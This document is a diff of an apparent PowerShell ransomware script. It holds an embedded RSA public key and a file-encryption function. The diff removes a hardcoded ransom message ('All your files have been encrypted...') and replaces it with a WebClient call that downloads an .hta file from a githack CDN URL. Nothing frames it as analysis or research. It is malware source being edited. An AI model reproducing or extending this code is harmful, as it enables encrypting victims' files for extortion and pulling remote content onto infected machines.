@@ -1,6 +1,6 @@
 $web = New-Object Net.WebClient
 $key = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCvXIGeuwHQzt0XVyRBA9/bCK7j9b4celVVd5ATSr/6Ev6QiBagf+d11l71Eqhznddzgi5+hEB+j5VPJq+4EjdD7JLnVjd/kxd4xkCFjkWsjEY9Vh41kZDoB3F0z92zkwHIx/wVtJJdq6vUX1Q9TMSRjQrA+XpdotSU+2Q/lBP12QIDAQAB"
-$text = "All your files have been encrypted due to a security problem with your PC. If you want to restore them, write us to the e-mail abc@abc.cc"
+$text = $web.DownloadString("https://rawcdn.githack.com/hassanwalikhan/isp/331f3be9c0664065559ae26d6ed2a5b4a9130542/info.hta")
 
 function Encrypt-File($String, $Passphrase)
 {
